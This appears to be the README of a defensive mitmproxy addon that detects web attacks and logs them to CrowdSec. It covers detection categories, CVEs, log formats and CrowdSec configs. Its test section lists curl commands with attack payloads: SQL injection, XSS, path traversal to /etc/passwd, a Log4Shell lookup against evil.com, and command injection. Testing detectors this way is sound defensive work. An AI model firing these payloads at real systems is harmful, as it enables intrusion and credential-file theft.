# SecuBox Analytics Addon v2.0

Advanced threat detection addon for mitmproxy with CrowdSec integration.

## Features

### Threat Detection Categories

| Category | Patterns | Severity | Description |
|----------|----------|----------|-------------|
| **Path Scans** | 50+ | Medium | Config files, admin panels, backups, web shells |
| **SQL Injection** | 25+ | Critical | Classic, blind, error-based, hex/char encoding |
| **XSS** | 30+ | High | Script tags, event handlers, DOM manipulation |
| **Command Injection** | 20+ | Critical | Shell commands, code execution, reverse shells |
| **Path Traversal** | 12+ | High | Directory traversal, encoding bypass |
| **SSRF** | 10+ | High | Internal IP targeting, cloud metadata |
| **XXE** | 8+ | Critical | XML external entity injection |
| **LDAP Injection** | 10+ | High | LDAP query manipulation |
| **Log4Shell** | 7+ | Critical | JNDI/Log4j (CVE-2021-44228) |

### Known CVE Detection

- **CVE-2021-44228** - Log4Shell (JNDI injection)
- **CVE-2021-41773/42013** - Apache path traversal
- **CVE-2022-22963** - Spring Cloud Function RCE
- **CVE-2022-22965** - Spring4Shell
- **CVE-2023-34362** - MOVEit Transfer
- **CVE-2024-3400** - PAN-OS GlobalProtect

### Additional Features

- **Rate Limiting**: Detects request flooding (100 req/60s threshold)
- **Suspicious Headers**: Identifies attack tool fingerprints
- **Bot Detection**: 40+ scanner/bot signatures
- **GeoIP**: Country-based tracking (requires MaxMind DB)
- **Client Fingerprinting**: MD5 hash of browser characteristics

## Output Files

| File | Description |
|------|-------------|
| `/var/log/secubox-access.log` | Full access log (JSON lines) |
| `/var/log/crowdsec/secubox-mitm.log` | CrowdSec-compatible threat log |
| `/tmp/secubox-mitm-alerts.json` | Last 100 security alerts |
| `/tmp/secubox-mitm-stats.json` | Real-time statistics |

## Log Format

### Access Log Entry
```json
{
  "timestamp": "2026-01-31T15:30:00Z",
  "client_ip": "203.0.113.50",
  "country": "CN",
  "method": "GET",
  "host": "example.com",
  "path": "/admin/../../../etc/passwd",
  "scan": {
    "is_scan": true,
    "pattern": "path_traversal",
    "type": "traversal",
    "severity": "high",
    "category": "file_access"
  },
  "client": {
    "fingerprint": "a1b2c3d4e5f6",
    "user_agent": "Mozilla/5.0...",
    "is_bot": false,
    "device": "linux"
  },
  "rate_limit": {
    "is_limited": false,
    "count": 15
  }
}
```

### CrowdSec Log Entry
```json
{
  "timestamp": "2026-01-31T15:30:00Z",
  "source_ip": "203.0.113.50",
  "country": "CN",
  "request": "GET /admin/../../../etc/passwd",
  "type": "traversal",
  "pattern": "path_traversal",
  "category": "file_access",
  "severity": "high",
  "cve": "",
  "is_bot": false,
  "rate_limited": false
}
```

## CrowdSec Integration

### Custom Parser

Create `/etc/crowdsec/parsers/s02-enrich/secubox-mitm.yaml`:

```yaml
name: secubox/secubox-mitm
description: "Parse SecuBox MITM threat logs"
filter: "evt.Parsed.program == 'secubox-mitm'"
onsuccess: next_stage
nodes:
  - grok:
      pattern: '%{GREEDYDATA:json_log}'
      apply_on: message
  - statics:
      - parsed: source_ip
        expression: JsonExtract(evt.Parsed.json_log, "source_ip")
      - parsed: type
        expression: JsonExtract(evt.Parsed.json_log, "type")
      - parsed: severity
        expression: JsonExtract(evt.Parsed.json_log, "severity")
      - parsed: pattern
        expression: JsonExtract(evt.Parsed.json_log, "pattern")
      - meta: source_ip
        expression: evt.Parsed.source_ip
```

### Custom Scenario

Create `/etc/crowdsec/scenarios/secubox-mitm-threats.yaml`:

```yaml
type: trigger
name: secubox/mitm-critical-threat
description: "Block critical threats detected by SecuBox MITM"
filter: evt.Parsed.severity == "critical"
groupby: evt.Parsed.source_ip
blackhole: 5m
labels:
  type: scan
  service: http
  remediation: true
```

## Usage

### Enable in mitmproxy

```bash
# Run with addon
mitmdump -s /srv/mitmproxy/addons/secubox_analytics.py

# Or in mitmweb
mitmweb -s /srv/mitmproxy/addons/secubox_analytics.py
```

### View Real-time Stats

```bash
# Watch stats file
watch -n 5 'cat /tmp/secubox-mitm-stats.json | jq'

# View recent alerts
cat /tmp/secubox-mitm-alerts.json | jq '.[-5:]'

# Tail CrowdSec log
tail -f /var/log/crowdsec/secubox-mitm.log | jq
```

### Test Detection

```bash
# SQL Injection
curl "http://target/page?id=1'+OR+'1'='1"

# XSS
curl "http://target/search?q=<script>alert(1)</script>"

# Path Traversal
curl "http://target/../../../etc/passwd"

# Log4Shell
curl -H "X-Api-Token: \${jndi:ldap://evil.com/a}" http://target/

# Command Injection
curl "http://target/ping?host=127.0.0.1;cat+/etc/passwd"
```

## Configuration

### Rate Limiting

Modify in `secubox_analytics.py`:

```python
# Default: 100 requests per 60 seconds
rate_limit = self._check_rate_limit(source_ip, window_seconds=60, max_requests=100)
```

### GeoIP Database

Download MaxMind GeoLite2:

```bash
# Place database at:
/srv/mitmproxy/GeoLite2-Country.mmdb
```

## Severity Levels

| Level | Action | Examples |
|-------|--------|----------|
| **Critical** | Immediate alert | SQL injection, Command injection, Log4Shell, XXE |
| **High** | Alert + Log | XSS, Path traversal, SSRF, LDAP injection |
| **Medium** | Log only | Path scans, Bot detection, Config file access |
| **Low** | Stats only | Rate limiting, Suspicious headers |

## Bot Signatures

Detected scanners and tools:
- Security: Nmap, Nikto, Nuclei, SQLMap, Burp Suite, OWASP ZAP
- Crawlers: zgrab, masscan, gobuster, ffuf, feroxbuster
- HTTP Clients: curl, wget, python-requests, go-http-client
- Bad Bots: AhrefsBot, SemrushBot, MJ12bot, etc.

## License

Apache 2.0 - Part of SecuBox OpenWrt
